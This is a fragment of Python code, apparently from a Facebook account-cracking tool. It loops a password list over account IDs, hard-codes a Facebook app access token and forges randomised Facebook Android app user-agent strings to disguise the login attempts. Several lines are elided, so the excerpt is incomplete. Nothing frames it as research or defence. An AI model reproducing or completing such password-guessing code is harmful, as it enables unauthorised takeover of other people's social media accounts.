...
def rd2(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				fbcr = sim_id
				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/446.0.0.29.42;FBBV/357914475;FBRV/375920481;FBPN/com.facebook.katana;FBLC/en_GB;FBMF/Realme;FBBD/Realme;FBDV/RMX3511;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
